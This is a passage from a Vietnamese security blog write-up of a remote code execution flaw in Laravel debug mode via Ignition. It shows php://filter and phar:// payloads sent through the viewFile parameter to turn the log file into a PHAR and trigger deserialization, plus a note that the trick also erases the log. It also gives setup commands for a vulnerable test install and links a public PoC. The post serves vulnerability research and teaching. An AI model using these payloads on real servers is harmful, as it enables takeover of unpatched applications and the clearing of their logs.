</span></span></code></pre></td></tr></table></div></div><h4 id=bước-4-convert-file-log-sang-file-phar>Bước 4: Convert file log sang file PHAR<a hidden class=anchor aria-hidden=true href=#bước-4-convert-file-log-sang-file-phar>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>viewFile</span><span class=o>:</span> <span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>write</span><span class=o>=</span><span class=nx>convert</span><span class=o>.</span><span class=nx>quoted</span><span class=o>-</span><span class=nx>printable</span><span class=o>-</span><span class=nx>decode</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>iconv</span><span class=o>.</span><span class=nx>utf</span><span class=o>-</span><span class=mi>16</span><span class=nx>le</span><span class=o>.</span><span class=nx>utf</span><span class=o>-</span><span class=mi>8</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>decode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=/</span><span class=nx>path</span><span class=o>/</span><span class=nx>to</span><span class=o>/</span><span class=nx>storage</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>laravel</span><span class=o>.</span><span class=nx>log</span>
</span></span></code></pre></td></tr></table></div></div><p>Chú ý, ở bước này có thể sử dụng <code>utf-16le</code> hoặc <code>utf-16be</code>, tuỳ theo các nào được nhé</p><blockquote><p>Mình sử dụng cách này để xóa log, khi mà nó hoạt động chính xác, sẽ k tìm thấy đoạn base64 nào cả nên output trả về là không có gì, thành ra xóa được log. Gửi request 1 lần k được thì thử vài lần xem sao nhé.</p></blockquote><h4 id=bước-5-chạy-phar-deserialization>Bước 5: Chạy PHAR deserialization<a hidden class=anchor aria-hidden=true href=#bước-5-chạy-phar-deserialization>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>viewFile</span><span class=o>:</span> <span class=nx>phar</span><span class=o>:///</span><span class=nx>path</span><span class=o>/</span><span class=nx>to</span><span class=o>/</span><span class=nx>storage</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>laravel</span><span class=o>.</span><span class=nx>log</span>
</span></span></code></pre></td></tr></table></div></div><p>Và ta được thành quả</p><p><img loading=lazy src=https://images.viblo.asia/d5d7bbc8-a105-402b-8056-e35dcb1432e6.png alt></p><h1 id=exploit-poc>Exploit PoC<a hidden class=anchor aria-hidden=true href=#exploit-poc>#</a></h1><p>Nếu ai muốn thử nghiệm thì đợi mình build xong Docker rồi chạy nhé, tạm thời dùng tạm cái này đã nha</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git clone https://github.com/laravel/laravel.git
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> laravel
</span></span><span class=line><span class=cl>$ git checkout e849812
</span></span><span class=line><span class=cl>$ composer install
</span></span><span class=line><span class=cl>$ composer require facade/ignition<span class=o>==</span>2.5.1
</span></span><span class=line><span class=cl>$ php artisan serve
</span></span></code></pre></td></tr></table></div></div><p>Chúng mình có viết xong PoC exploit ở đây, hi vọng có ích cho mọi người ;)</p><p>Github: <a href=https://github.com/khanhnv-2091/laravel-8.4.2-rce>https://github.com/khanhnv-2091/laravel-8.4.2-rce</a></p><p>Cảm ơn anh @vigov5 và @com0tf3 đã hỗ trợ nghiên cứu CVE này.</p><h1 id=tham-khảo>Tham khảo<a hidden class=anchor aria-hidden=true href=#tham-khảo>#</a></h1><ul><li><a href=https://www.ambionics.io/blog/laravel-debug-rce>https://www.ambionics.io/blog/laravel-debug-rce</a></li></ul><blockquote><p>Bài chưa hết ở đây nhớ, còn phần 2 :D</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/happy-new-year/>Happy New Year</a></li><li><a href=https://minhtuanact.github.io/tags/rce/>RCE</a></li><li><a href=https://minhtuanact.github.io/tags/laravel/>Laravel</a></li><li><a href=https://minhtuanact.github.io/tags/php/>PHP</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/pdf-export-can-than-voi-nhung-input-co-the-truyen-vao/><span class=title>« Prev</span><br><span>PDF Export, cẩn thận với những input có thể truyền vào</span></a>
<a class=next href=https://minhtuanact.github.io/posts/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1/><span class=title>Next »</span><br><span>Các cấu hình sai Nginx phổ biến khiến web server của bạn gặp nguy hiểm (Part 1)</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on twitter" href="https://twitter.com/intent/tweet/?text=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f&hashtags=HappyNewYear%2cRCE%2cLaravel%2cPHP"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f&title=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP&summary=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f&title=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on whatsapp" href="https://api.whatsapp.com/send?text=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Laravel  on telegram" href="https://telegram.me/share/url?text=Laravel%20%3c%3d%20v8.4.2%20debug%20mode%3a%20Remote%20code%20execution%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20%c4%91i%e1%bb%81u%20khi%e1%bb%83n%20m%c3%a1y%20th%e1%ba%b1ng%20b%e1%ba%a1n%20%c4%91ang%20code%20PHP&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flaravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>